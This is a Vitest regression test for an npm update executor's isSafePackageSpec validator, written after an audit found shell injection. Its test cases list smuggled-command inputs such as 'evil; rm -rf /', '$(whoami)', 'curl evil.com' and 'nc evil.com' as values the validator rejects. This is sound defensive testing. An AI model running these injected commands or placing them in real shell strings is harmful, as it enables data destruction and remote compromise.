/**
 * Regression test for audit_1776853149979: src/update/executor.ts previously
 * built `npm install ${pkg}@${version}` as a shell string and ran it via
 * execSync. `pkg` and `version` come from npm-view output and the
 * update-history.json file (writable by anyone with FS access). A
 * tampered package name like 'evil; touch /tmp/x' would have been
 * interpreted by /bin/sh.
 *
 * The fix swapped to execFileSync (no shell) AND added isSafePackageSpec
 * as a pre-flight regex gate. This file pins the gate so a future
 * refactor can't silently widen it.
 */

import { describe, it, expect } from 'vitest';
import { isSafePackageSpec } from '../src/update/executor.js';

describe('isSafePackageSpec (audit_1776853149979)', () => {
  describe('happy path', () => {
    it.each([
      ['claude-flow', '3.6.10'],
      ['@claude-flow/cli', '3.6.10'],
      ['@claude-flow/cli', '3.6.10-alpha.1'],
      ['some-pkg', 'latest'],
      ['some-pkg', 'next'],
      ['some-pkg', '^1.0.0'],
      ['some-pkg', '~2.3.4'],
      ['some-pkg', '1.x'],
      ['some-pkg', '1.2.3+build.123'],
    ])('accepts %s@%s', (pkg, version) => {
      expect(isSafePackageSpec(pkg, version)).toBe(true);
    });
  });

  describe('shell injection in package name', () => {
    it.each([
      ['evil; rm -rf /'],
      ['evil`whoami`'],
      ['evil$(whoami)'],
      ['evil|cat'],
      ['evil&touch'],
      ['evil >output'],
      ['evil\nrm'],
      ['evil\\rm'],
    ])('rejects package name "%s"', (pkg) => {
      expect(isSafePackageSpec(pkg, '1.0.0')).toBe(false);
    });
  });

  describe('shell injection in version', () => {
    it.each([
      ['1.0.0; rm -rf /'],
      ['1.0.0`whoami`'],
      ['1.0.0$(whoami)'],
      ['1.0.0 && curl evil.com'],
      ['1.0.0|nc evil.com'],
    ])('rejects version "%s"', (version) => {
      expect(isSafePackageSpec('claude-flow', version)).toBe(false);
    });
  });

  describe('edge cases', () => {
    it('rejects an empty package name', () => {
      expect(isSafePackageSpec('', '1.0.0')).toBe(false);
    });

    it('rejects an empty version', () => {
      expect(isSafePackageSpec('claude-flow', '')).toBe(false);
    });

    it('rejects a package name starting with a dot or hyphen', () => {
      expect(isSafePackageSpec('-evil', '1.0.0')).toBe(false);
      expect(isSafePackageSpec('.evil', '1.0.0')).toBe(false);
    });

    it('rejects a package name longer than the npm limit (214 chars)', () => {
      expect(isSafePackageSpec('a'.repeat(215), '1.0.0')).toBe(false);
    });

    it('rejects a version longer than 64 chars', () => {
      expect(isSafePackageSpec('claude-flow', '1.'.repeat(40))).toBe(false);
    });

    it('rejects a malformed scoped package name', () => {
      expect(isSafePackageSpec('@/cli', '1.0.0')).toBe(false);
      expect(isSafePackageSpec('@scope', '1.0.0')).toBe(false); // missing /name
      expect(isSafePackageSpec('@scope/', '1.0.0')).toBe(false); // empty name
    });
  });
});
